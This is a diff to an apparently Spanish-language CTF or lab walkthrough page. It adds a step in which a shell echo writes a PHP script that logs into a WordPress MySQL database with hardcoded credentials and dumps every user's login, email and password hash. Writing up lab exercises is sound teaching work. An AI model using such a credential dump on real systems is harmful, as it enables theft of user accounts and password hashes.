@@ -127,10 +127,36 @@ hostname -
 </code></pre>
 <p>Nos muestar informacion interesante.</p>
 <img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-28%20161445.png?raw=true" alt="Captura de pantalla">
- 
+ <p>Debemos ejecutar el siguiente scripts para que nos genere las credenciales.</p>
 <pre><code>
-             
-</code></pre>
+ echo "<?php
+ \$host = '172.17.0.1';
+ \$username = 'wp_user';
+ \$password = 'wp_password';
+ \$database = 'wordpress';
+ \$mysqli = new mysqli(\$host, \$username, \$password, \$database);
+ if (\$mysqli->connect_error) {
+ die('Connection failed: ' . \$mysqli->connect_error);
+ }
+ \$query = 'SELECT * FROM wp_users';
+ \$result = \$mysqli->query(\$query);
+ if (\$result && \$result->num_rows > 0) {
+ while (\$row = \$result->fetch_assoc()) {
+ echo 'ID: ' . \$row['ID'] . \"\\n\";
+ echo 'Username: ' . \$row['user_login'] . \"\\n\";
+ echo 'Email: ' . \$row['user_email'] . \"\\n\";
+ echo 'Display Name: ' . \$row['display_name'] . \"\\n\";
+ echo 'Password Hash: ' . \$row['user_pass'] . \"\\n\";
+ echo \"-----------------------------------\\n\";
+ }
+ } else {
+ echo 'No users found or query failed.' . \"\\n\";
+ }
+ \$mysqli->close();
+ ?>" > test2.php
+para que corra el progama 
+php test2.php
+ </code></pre>
 
 
 
